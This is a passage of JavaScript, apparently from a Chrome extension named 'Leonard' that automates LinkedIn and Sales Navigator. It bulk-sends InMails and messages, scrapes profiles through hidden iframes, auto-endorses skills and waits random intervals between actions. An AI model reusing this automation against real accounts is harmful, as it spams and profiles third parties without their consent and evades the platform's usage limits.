                            showNotification(local_strings['NO_PROFILES_TO_SEND_INMAILS']);
                            downloadCSVIfEnabled();
                            stopLeonard();
                            return false;
                        }
                        startNextPageTimer('inmail');
                    });
                    return false;
                }
                if (!local_data.selectedInMail) {
                    chrome.storage.local.set({
                        nextPageRedirect: false
                    });
                    return false;
                }
                if (cont_div.length == 0 || (!isSalesNav && cont_div.find("div > a:first").length == 0) || (isSalesNav && cont_div.find(".result-lockup__name").length > 0 && cont_div.find(".result-lockup__name a").length == 0)) {
                    activateThisTab(function() {
                        setTimeout(function() {
                            $("#start_sending_inm").text("STOP");
                            $("#start_sending_inm").addClass("started");
                            setStopLeonardBtn(true);
                            leonard_stopped = false;
                            startMailing();
                        }, 1000);
                    })
                    // showNotification(local_strings['ACTIVATE_LINKEDIN']);
                    stopLeonard(true);
                    return false;
                }
                var elOffset = cont_div.offset().top;
                var elHeight = cont_div.height();
                var windowHeight = $(window).height();
                var offset;
                if (elHeight < windowHeight) {
                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                } else {
                    offset = elOffset;
                }
                $('html, body').animate({
                    scrollTop: offset
                }, 100);
                /* code for scrolling into view (ember bug)*/
                if (cont_div.hasClass("search-result__occlusion-hint")) {
                    setTimeout(startMailing, 1000);
                    return false;
                }
                if(cont_div.find(".search-result__actions").length == 0 && cont_div.find(".content-wrapper").length == 0 && cont_div.find(".bd").length == 0 && cont_div.find(".result-lockup__actions").length == 0){
                    currentIdx++;
                    startMailing(currentIdx);
                    return false;
                }
                var entityUrn, btnText, profile_link;
                if(cont_div.find("div > a:first").length > 0){
                    entityUrn = cont_div.find("div > a:first").attr("href").slice(4, -1);
                    profile_link = cont_div.find("div > a:first").attr("href");
                } else if(cont_div.find(".result-lockup__name a").length > 0){
                    profile_link = cont_div.find(".result-lockup__name a").attr("href");
                }
                if(profile_link){
                    var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                    if(entityUrnMatch && entityUrnMatch.length > 0){
                        entityUrn = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                    }
                }
                var tracking_id = cont_div.find("div > a").attr("data-control-id");
                var member_id;
                var view_url = cont_div.find("div > a:first").attr("href");
                if (isSalesNav) {
                    view_url = cont_div.find("a.name-link").length > 0 && cont_div.find("a.name-link")[0].href;
                    if(!view_url){
                        view_url = cont_div.find(".result-lockup__name a").attr("href");
                    }
                    if(cont_div.find(".result-lockup__message").length > 0){
                        btnText = cont_div.find(".result-lockup__message").text().trim();
                    } else {
                        btnText = cont_div.find("button.search-result__actions--primary").text().trim();
                        if(btnText != local_strings['MSG_BTN_TEXT']){
                            btnText = cont_div.find("button.send-message").text().trim();
                        }
                    }
                    member_id = cont_div.find("[name=memberId]").val();
                } else {
                    if (idUrnMapObj[tracking_id] && idUrnMapObj[tracking_id].member_id) {
                        member_id = idUrnMapObj[tracking_id].member_id.slice(14);
                    }
                    btnText = cont_div.find("button.search-result__actions--primary").text().trim();
                }
                if (view_url.indexOf('www.linkedin.com') == -1) {
                    view_url = 'https://www.linkedin.com' + view_url;
                }
                var comm_found_idx;
                if(recentComms){
                    recentComms.forEach(function(comm, idx) {
                        if(( ( comm.entityUrn == entityUrn ) || 
                            ( comm.profile_id == entityUrn ) || 
                            ( comm.member_id == member_id && member_id ) )){
                            comm_found_idx = idx;
                        }
                    });
                }
                cont_div.find(".time_rem_span").remove();
                if(isProfileSkipped(entityUrn) || isProfileSkipped(member_id)){
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startMailing(currentIdx);
                } else if (recentComms[comm_found_idx]) {
                    var already_sent_text = local_strings['INMD_ALREADY_30'];
                    if(user_details.skipInMail){
                        already_sent_text = "Sent an Inmail in the last "+user_details.skipMessage+" day(s)";
                    }
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(already_sent_text));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(already_sent_text));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(already_sent_text));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startMailing(currentIdx);
                } else {
                    if (btnText != local_strings['INMAIL_BTN_TEXT'] && btnText != local_strings['MSG_BTN_TEXT']) {
                        var error_message = local_strings['CANT_SEND_INMAIL'];
                        cont_div.find(".search-result__actions").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(error_message));
                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(error_message));
                        } else if (cont_div.find(".bd").length > 0) {
                            cont_div.find(".bd").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(error_message));
                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                'class': 'time_rem_span'
                            }).text(error_message));
                        }
                        cont_div.addClass("leo_skipped");
                        currentIdx++;
                        startMailing(currentIdx);
                    } else {
                        var status_message = local_strings['SENDING_INMAIL'];
                        if(firstDegreeConn || (isSalesNav && btnText == local_strings['MSG_BTN_TEXT'])){
                            status_message = local_strings['SENDING_MSG'];
                        }
                        cont_div.addClass("leo_visiting");
                        cont_div.find(".search-result__actions").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(status_message));
                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(status_message));
                        } else if (cont_div.find(".bd").length > 0) {
                            cont_div.find(".bd").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(status_message));
                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                'class': 'time_rem_span'
                            }).text(status_message));
                        }
                        if(isSalesNav){
                            $.ajax({
                                url: view_url,
                                success: function(response) {
                                    // find profile identifier
                                    if(response.match(/profileId:(.*?),/)){
                                        var temp_entityUrn = response.match(/profileId:(.*?),/)[1];
                                        if(temp_entityUrn.length == 39){
                                            entityUrn = temp_entityUrn;
                                        }
                                    } else if(response.match(/sales\/.*?\/(.*?),/)){
                                        var temp_entityUrn = response.match(/sales\/.*?\/(.*?),/)[1];
                                        if(temp_entityUrn.length == 39){
                                            entityUrn = temp_entityUrn;
                                        }
                                    }
                                },
                                error: function() {
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_SEND_INMAIL']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_INMAIL']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_INMAIL']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_SEND_INMAIL']));
                                    }
                                    currentIdx++;
                                    startMailing(currentIdx);
                                },
                                async: false
                            });
                        }
                        visitProfile(entityUrn, function(attrs){
                            if(attrs){
                                var firstName = attrs.firstName;
                                var lastName = attrs.lastName;
                                var publicIdentifier = attrs.publicIdentifier;
                                var profile_id = attrs.objectUrn;
                                var isInMail = btnText != 'Message';
                                isInMail = !isSalesNav && btnText == 'Message';
                                if(firstDegreeConn){
                                    isInMail = false;
                                } else {
                                    isInMail = true;
                                }
                                var inmails_tags = $('#inmails_tags option:selected').length > 0 ? $('#inmails_tags option:selected').map(function() {
                                    return $(this).text();
                                }).toArray().join(',') : '';
                                if (inmails_tags == "" && local_data.selectedTags.length > 0) {
                                    var inmails_tags_arr = [];
                                    tags.forEach(function(t) {
                                        if(local_data.selectedTags.indexOf(t.id) > -1){
                                            inmails_tags_arr.push(t.tag_name);
                                        }
                                    });
                                    inmails_tags = inmails_tags_arr.join(',');
                                }
                                var moduleKey, pageKey, contextId, requestId, pageNumber, authToken, authType;
                                if(view_url){
                                    var key_arr = view_url.replace(/.*?profile\//, '').split('?');
                                    if(key_arr.length > 0){
                                        var profile_id = key_arr[0].split(',')[0];
                                        authToken = key_arr[0].split(',')[1];
                                        authType = key_arr[0].split(',')[2];
                                        if(key_arr.length > 0){
                                            var key_obj = key_arr[1].split('&');
                                            
                                            key_obj.forEach(function(k) {
                                                switch (k.split('=')[0]) {
                                                    case 'moduleKey':
                                                        moduleKey = k.split('=')[1] || 'peopleSearchResults';
                                                        break;
                                                    case 'pageKey':
                                                        pageKey = k.split('=')[1] || 'sales-search3-saved-search-delta';
                                                        break;
                                                    case 'contextId':
                                                        contextId = k.split('=')[1];
                                                        break;
                                                    case 'requestId':
                                                        requestId = k.split('=')[1];
                                                        break;
                                                    case 'pageNumber':
                                                        pageNumber = k.split('=')[1];
                                                        break;
                                                }
                                            });
                                        }
                                        attrs.moduleKey = moduleKey;
                                        attrs.pageKey = pageKey;
                                        attrs.contextId = contextId;
                                        attrs.requestId = requestId;
                                        attrs.pageNumber = pageNumber;
                                        attrs.authToken = authToken;
                                        attrs.authType = authType;
                                    }
                                }
                                sendPersonalMessage(attrs, function(is_error) {
                                    if (is_error == 'error') {
                                        cont_div.find(".time_rem_span").remove();
                                        cont_div.addClass("leo_visit_error");
                                        cont_div.find(".search-result__actions").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_WHILE'] + status_message));
                                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_WHILE'] + status_message));
                                        } else if (cont_div.find(".bd").length > 0) {
                                            cont_div.find(".bd").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_WHILE'] + status_message));
                                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_WHILE'] + status_message));
                                        }
                                        currentIdx++;
                                        startMailing(currentIdx);
                                        return false;
                                    } else if(is_error == 'already_sent_error'){
                                        var already_sent_text = local_strings['INMD_ALREADY_30'];
                                        if(user_details.skipInMail){
                                            already_sent_text = "Sent an Inmail in the last "+user_details.skipMessage+" day(s)";
                                        }
                                        cont_div.find(".time_rem_span").remove();
                                        cont_div.addClass("leo_visit_error");
                                        cont_div.find(".search-result__actions").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(already_sent_text));
                                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(already_sent_text));
                                        } else if (cont_div.find(".bd").length > 0) {
                                            cont_div.find(".bd").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(already_sent_text));
                                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(already_sent_text));
                                        }
                                        currentIdx++;
                                        startMailing(currentIdx);
                                        return false;
                                    }
                                    if (!is_error) {
                                        obj = attrs;
                                        obj.tags = inmails_tags;
                                        if(obj.tags){
                                            chrome.runtime.sendMessage({
                                                obj: obj,
                                                saveTags: true
                                            }, function(){
                                                
                                            });
                                        }
                                    }
                                    finished_inms_in_remaining++;
                                    local_data.currentIdx++;
                                    currentIdx++;
                                    local_data.REMAINING_INMAILS--;
                                    if (local_data.rim <= finished_inms_in_remaining || local_data.REMAINING_INMAILS <= 0) {
                                        clearInterval(nextViewInter);
                                        nextViewInter = null;
                                        clearTimeout(nextViewTimer);
                                        nextViewTimer = null;
                                        chrome.storage.local.set({
                                            nextPageRedirect: false
                                        });
                                        $("#start_sending_inm").text(local_strings['SEND']);
                                        $("#start_sending_inm").removeClass("started");
                                        updateInMailCount(function(){
                                            currentIdx = 0;
                                            // local_data.startedMailing = false;
                                            local_data.rim = local_data.REMAINING_INMAILS;
                                            local_data.selectedInMail = false;
                                            local_data.selectedInMailSubject = false;
                                            local_data.selectedInMailAttachments = [];
                                            updateLocalData(function() {
                                                chrome.runtime.sendMessage({
                                                    removeBadge: true
                                                })
                                                // showNotification(local_strings['FINISHED_CONN_REQ_1'] + finished_inms_in_remaining + local_strings['FINISHED_INMAIL_2']);
                                                notifyUser(local_strings['FINISHED_CONN_REQ_1'] + finished_inms_in_remaining + local_strings['FINISHED_INMAIL_2']);
                                                var status_message = local_strings['INMAIL_SENT'];
                                                if(firstDegreeConn || (isSalesNav && btnText == local_strings['MSG_BTN_TEXT'])){
                                                    status_message = local_strings['MSG_SENT'];
                                                }
                                                cont_div.find(".time_rem_span").text(status_message);
                                                cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                updateLocalData();
                                                setStopLeonardBtn(false);
                                                stopLeonard(false);
                                            })
                                        });
                                        return false;
                                    } else {
                                        updateInMailCount(function(){
                                            var RANDOM_TIMER = randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT);
                                            updateLocalData(function() {
                                                var end_timer = Date.now() + RANDOM_TIMER;
                                                if (nextViewInter) {
                                                    clearInterval(nextViewInter);
                                                    nextViewInter = null;
                                                }
                                                nextViewInter = setInterval(function() {
                                                    if (!local_data.startedMailing || ($("#start_sending_inm").length > 0 && !$("#start_sending_inm").hasClass("started"))) {
                                                        clearTimeout(nextViewInter);
                                                        nextViewInter = null;
                                                        return false;
                                                    }
                                                    var end_time = Math.round((end_timer - Date.now()) / 1000);
                                                    if (end_time < 1) {
                                                        clearInterval(nextViewInter);
                                                        nextViewInter = null;
                                                    }
                                                    if (inMailPremiumOnly) {
                                                        while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                                                            if(leonard_stopped){
                                                                break;
                                                            }
                                                            currentIdx++;
                                                            cont_div = $(".results-list > li").eq(currentIdx);
                                                            if ($("#results").length > 0) {
                                                                cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                            } else if ($("#results-list").length > 0) {
                                                                cont_div = $("#results-list > li").eq(currentIdx);
                                                            }
                                                            if(cont_div.length == 0){
                                                                cont_div = $(".search-results__list > li").eq(currentIdx);
                                                            }
                                                            if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                                var elOffset = cont_div.offset().top;
                                                                var elHeight = cont_div.height();
                                                                var windowHeight = $(window).height();
                                                                var offset;
                                                                if (elHeight < windowHeight) {
                                                                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                                } else {
                                                                    offset = elOffset;
                                                                }
                                                                $('html, body').animate({
                                                                    scrollTop: offset
                                                                }, 100);
                                                                setTimeout(startMailing, 1000);
                                                                return false;
                                                            }
                                                        }
                                                        if(leonard_stopped){
                                                            stopLeonard();
                                                            return false;
                                                        }
                                                    }
                                                    if (skipProfileWithNoPicMail) {
                                                        while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                                                            if(leonard_stopped){
                                                                break;
                                                            }
                                                            currentIdx++;
                                                            cont_div = $(".results-list > li").eq(currentIdx);
                                                            if ($("#results").length > 0) {
                                                                cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                            } else if ($("#results-list").length > 0) {
                                                                cont_div = $("#results-list > li").eq(currentIdx);
                                                            }
                                                            if(cont_div.length == 0){
                                                                cont_div = $(".search-results__list > li").eq(currentIdx);
                                                            }
                                                            if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                                var elOffset = cont_div.offset().top;
                                                                var elHeight = cont_div.height();
                                                                var windowHeight = $(window).height();
                                                                var offset;
                                                                if (elHeight < windowHeight) {
                                                                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                                } else {
                                                                    offset = elOffset;
                                                                }
                                                                $('html, body').animate({
                                                                    scrollTop: offset
                                                                }, 100);
                                                                setTimeout(startMailing, 1000);
                                                                return false;
                                                            }
                                                        }
                                                        if(leonard_stopped){
                                                            stopLeonard();
                                                            return false
                                                        }
                                                    }
                                                    if((isSalesNav && cont_div.find(".degree-icon").text().trim() != '1st') || cont_div.find(".dist-value").text().trim() != "1st"){
                                                        if(!sendUsingCredits){
                                                            while (cont_div.find(".openlink-badge, .m-type--open-link").length == 0 && currentIdx <= search_records_count) {
                                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                                    'class': 'time_rem_span'
                                                                }).text(local_strings['SKIPPED']));
                                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                                        'class': 'time_rem_span'
                                                                    }).text(local_strings['SKIPPED']));
                                                                } else if (cont_div.find(".bd").length > 0) {
                                                                    cont_div.find(".bd").prepend($('<span />', {
                                                                        'class': 'time_rem_span'
                                                                    }).text(local_strings['SKIPPED']));
                                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                                        'class': 'time_rem_span'
                                                                    }).text(local_strings['SKIPPED']));
                                                                }
                                                                cont_div.addClass("leo_skipped");
                                                                currentIdx++;
                                                                cont_div = $(".results-list > li").eq(currentIdx);
                                                                if ($("#results").length > 0) {
                                                                    cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                                } else if ($("#results-list").length > 0) {
                                                                    cont_div = $("#results-list > li").eq(currentIdx);
                                                                }
                                                                if(cont_div.length == 0){
                                                                    cont_div = $(".search-results__list > li").eq(currentIdx);
                                                                }
                                                            }
                                                        }
                                                    }
                                                    end_time = end_time + " secs";
                                                    var status_message = local_strings['SENDING_INMAIL_IN'] + end_time;
                                                    if(firstDegreeConn || (isSalesNav && btnText == local_strings['MSG_BTN_TEXT'])){
                                                        status_message = local_strings['SENDING_MSG_IN'] + end_time;
                                                    }
                                                    cont_div.addClass("leo_visiting");
                                                    cont_div.find(".time_rem_span").remove();
                                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(status_message));
                                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    } else if (cont_div.find(".bd").length > 0) {
                                                        cont_div.find(".bd").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    }
                                                }, 1000);
                                                if (nextViewTimer) {
                                                    clearTimeout(nextViewTimer);
                                                    nextViewTimer = null;
                                                }
                                                nextViewTimer = setTimeout(function() {
                                                    cont_div.find(".time_rem_span").remove();
                                                    cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                    var status_message = local_strings['INMAIL_SENT'];
                                                    if(firstDegreeConn || (isSalesNav && btnText == local_strings['MSG_BTN_TEXT'])){
                                                        status_message = local_strings['MSG_SENT'];
                                                    }
                                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(status_message));
                                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    } else if (cont_div.find(".bd").length > 0) {
                                                        cont_div.find(".bd").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(status_message));
                                                    }
                                                    chrome.runtime.sendMessage({
                                                        setBadge: finished_inms_in_remaining.toString(),
                                                        mode: 'message'
                                                    });
                                                    if (!local_data.startedMailing || ($("#start_sending_inm").length > 0 && !$("#start_sending_inm").hasClass("started"))) {
                                                        clearTimeout(nextViewTimer);
                                                        nextViewTimer = null;
                                                        return false;
                                                    }
                                                    clearInterval(nextViewInter);
                                                    nextViewInter = null;
                                                    startMailing(currentIdx);
                                                }, RANDOM_TIMER);
                                            });
                                        });
                                    }
                                },isInMail);
                            } else {
                                cont_div.find(".time_rem_span").remove();
                                cont_div.addClass("leo_visit_error");
                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_WHILE'] + status_message));
                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_WHILE'] + status_message));
                                } else if (cont_div.find(".bd").length > 0) {
                                    cont_div.find(".bd").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_WHILE'] + status_message));
                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_WHILE'] + status_message));
                                }
                                currentIdx++;
                                startMailing(currentIdx);
                                return false;
                            }
                        })
                    }
                }
            })
        })
    });
}

function openInNewTabAndScrape(url, callback){
    // if(isSalesNav){
    //     $.ajax({
    //         url: url,
    //         success: function(response) {
    //             callback(response);
    //         },
    //         error: function() {
    //             callback(false);
    //         }
    //     });
    // } else {
    //     local_data.frame_id = "frame_"+user_details.id;
    //     $('<iframe />',{id:local_data.frame_id,class:'leo_frame',isds:true,scrolling:'no'}).appendTo($("body"));
    //     $("#"+local_data.frame_id)[0].onload = function(){
    //         var that = this;
    //         setTimeout(function(){
    //             if(that.contentDocument)
    //                 callback(that.contentDocument.getElementsByTagName('html')[0].outerHTML);
    //             else
    //                 callback('');
    //             // $("#"+frame_id).remove();
    //         },3000);
    //     }
    //     $("#"+local_data.frame_id).attr("src", url);
    // }

    local_data.frame_id = "frame_"+user_details.id;
    $('<iframe />',{id:local_data.frame_id,class:'leo_frame',isds:true,scrolling:'no'}).appendTo($("body"));
    $("#"+local_data.frame_id)[0].onload = function(){
        var that = this;
        setTimeout(function(){
            if(that.contentDocument)
                callback(that.contentDocument.getElementsByTagName('html')[0].outerHTML);
            else
                callback(false);
            // $("#"+frame_id).remove();
        },3000);
    }
    $("#"+local_data.frame_id).attr("src", url);
    // chrome.runtime.sendMessage({
    //     openTabForVisiting : true,
    //     url: url
    // }, function(html){
    //     callback(html);
    // })
    // local_data.visitingTab = window.open(url);
    // local_data.visitingTab.onmessage = function(message){
    //     callback(message);
    // }
}


function startNextPageTimer(mode) {
    if (start_next_page_timer) {
        clearTimeout(start_next_page_timer);
        start_next_page_timer = null;
    }

    start_next_page_timer = setTimeout(function() {
        var cont_li_div = false;
        if ($("#results").length > 0 && $("#results > li[data-li-entity-id]").length > 0) {
            cont_li_div = $("#results > li[data-li-entity-id]");
        } else if ($("#results-list").length > 0) {
            cont_li_div = $("#results-list > li");
        } else if($(".results-list").length > 0) {
            cont_li_div = $(".results-list > li")
        } else if($(".search-results .search-results__result-list li.search-results__result-item").length > 0) {
            cont_li_div = $(".search-results .search-results__result-list li.search-results__result-item");
        } else if($(".search-results li.search-result").length > 0) {
            cont_li_div = $(".search-results li.search-result");
        }
        if (cont_li_div && ((
                cont_li_div.hasClass("leo_visited") ||
                cont_li_div.hasClass("leo_skipped") ||
                cont_li_div.hasClass("leo_visiting")
            ) ||
            (isSalesNav && (
                cont_li_div.hasClass("leo_visited") ||
                cont_li_div.hasClass("leo_skipped") ||
                cont_li_div.hasClass("leo_visiting")))
            )
        ) {
            if ($(".leo_visited, .leo_visiting, .leo_skipped, .leo_visit_error").length == 0) {
                stopLeonard();
                if (mode == 'view') {
                    $("#start_viewing").text(local_strings['START']);
                    $("#start_viewing").removeClass("started");
                    setStopLeonardBtn(false);
                } else if (mode == 'send') {
                    $("#start_sending_conn").text(local_strings['SEND']);
                    $("#start_sending_conn").removeClass("started");
                    setStopLeonardBtn(false);
                } else if (mode == 'scan') {
                    $("#start_scanning").text(local_strings['SEND']);
                    $("#start_scanning").removeClass("started");
                    setStopLeonardBtn(false);
                } else if (mode == 'message') {
                    $("#start_sending_msg").text(local_strings['SEND']);
                    $("#start_sending_msg").removeClass("started");
                    setStopLeonardBtn(false);
                } else if (mode == 'inmail') {
                    $("#start_sending_inm").text(local_strings['SEND']);
                    $("#start_sending_inm").removeClass("started");
                    setStopLeonardBtn(false);
                } else {
                    console.log("forgot to send mode");
                }
                return false;
            } else {
                startNextPageTimer(mode);
            }
        } else {
            currentIdx = 0;
            clearTimeout(start_next_page_timer);
            start_next_page_timer = null;
            leonard_stopped = false;
            if (mode == 'view') {
                startViewing();
            } else if (mode == 'scan') {
                startScanning();
            } else if (mode == 'send') {
                startSending();
            } else if (mode == 'message') {
                startMessaging();
            } else if(mode == 'inmail'){
                startMailing();
            }
        }
    }, 3000);
}

function saveViewToDB(attrs, callback) {
    chrome.runtime.sendMessage({
        audit: true,
        event: 'visit_profile'
    })
    if(autoFollowUsers){
        followUser(attrs);
    }
    if(autoEndorseUsers){
        if(attrs.skills && attrs.skills.length > 0 && !attrs.skills[0].name){
            var skills = attrs.skills.split(",");
            attrs.skills = skills.map(function(skill,idx){
                var skill_attrs = skill.split("||");
                return {name: skill_attrs[0], entityUrn: 'urn:li:fs_skill:('+attrs.entityUrn+','+skill_attrs[1]+')'};
            });
        }
        endorseUser(attrs);
    }
    delete attrs.profile_identifier;
    delete attrs.tags;
    attrs.viewed_linkedin_profile_id = attrs.publicIdentifier;
    attrs.firstname = attrs.firstName;
    attrs.lastname = attrs.lastName;
    attrs.member_id = attrs.objectUrn;
    attrs.viewed_linkedin_profile_url = LINKEDIN_PROFILE_URL + attrs.publicIdentifier;
    chrome.runtime.sendMessage({
        attrs: attrs,
        saveData: true
    }, function(resp) {
        if(resp == 'error'){
            callback('error');
        } else {
            attrs.user_id = user_details.id;
            attrs.date_viewed = new Date();
            var normattrs = Object.assign({}, attrs);
            views.push(attrs);
            if(isSalesNav && local_data.sales_tags_checked){
                var linked_sales_tag_ids = tags.filter(function(t){return local_data.selectedTags.indexOf(t.id) > -1 && t.linked_tag_id}).map(x=>x.linked_tag_id)
                tagUserInSalesNav(attrs.member_id, linked_sales_tag_ids, function(){
                    callback();
                },attrs);
            } else {
                callback();
            }
        }
    })
}

function saveConnToDB(obj, callback, attrs) {
    if(obj.response == 'error'){
        callback();
    } else {
        chrome.runtime.sendMessage({
            connObj: obj,
            saveConnData: true
        }, function(resp) {
            if(resp && resp.updated){
                callback('updated');
            } else {
                if(local_data.sales_tags_checked){
                    var linked_sales_tag_ids = tags.filter(function(t){return local_data.selectedTags.indexOf(t.id) > -1 && t.linked_tag_id}).map(x=>x.linked_tag_id)
                    tagUserInSalesNav(obj.c_member_id, linked_sales_tag_ids, function(){
                        callback();
                    },attrs);
                } else {
                    callback();
                }
            }
        })
    }
}

function updateMessageCount(callback){
    chrome.runtime.sendMessage({
        update_message_count : true
    }, function(resp) {
        callback();
    })
}

function updateInMailCount(callback){
    chrome.runtime.sendMessage({
        update_inmail_count : true
    }, function(resp) {
        callback();
    })
}

function updateLocalData(callback) {
    if ($("#range_slider").length > 0) {
        $("#range_slider").attr({
            "max": local_data.REMAINING_PROFILE_VIEWS,
            "value": local_data.rpv
        }).val(local_data.rpv).rangeslider('update', true).trigger("input");
        // $("#range_slider_temp").rangeslider('update', true).trigger("input");
        $("#remaining_temp, #remaining").attr("max",local_data.REMAINING_PROFILE_VIEWS);//.val(local_data.REMAINING_MESSAGES);
    }
    if ($("#conn_range_slider").length > 0) {
        $("#conn_range_slider").attr({
            "max": local_data.REMAINING_CONNECTION_REQUESTS,
            "value": local_data.rcr
        }).val(local_data.rcr).rangeslider('update', true).trigger("input");
        // $("#conn_range_slider_temp").rangeslider('update', true).trigger("input");
        $("#remaining_conn_req_temp, #remaining_conn_req").attr("max",local_data.REMAINING_CONNECTION_REQUESTS);//.val(local_data.REMAINING_MESSAGES);
    }
    if ($("#msg_range_slider").length > 0) {
        $("#msg_range_slider").attr({
            "max": local_data.REMAINING_MESSAGES,
            "value": local_data.rm
        }).val(local_data.rm).rangeslider('update', true).trigger("input");
